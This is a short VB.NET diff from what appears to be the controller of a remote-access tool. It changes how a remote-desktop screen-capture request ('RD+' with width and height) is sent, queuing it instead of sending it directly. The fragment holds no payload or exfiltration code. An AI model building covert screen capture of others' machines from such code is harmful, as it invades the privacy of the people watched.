@@ -46,7 +46,8 @@
                             If RD.Button1.Text = "Capturing..." Then
                                 Dim Bb As Byte() = SB("RD+" + Settings.SPL + RD.PictureBox1.Width.ToString + Settings.SPL + RD.PictureBox1.Height.ToString)
                                 Try
-                                    C.Send(Bb)
+                                    Dim ClientReq As New Outcoming_Requests(C, Bb)
+                                    Pending.Req_Out.Add(ClientReq)
                                 Catch ex As Exception
                                 End Try
                             End If
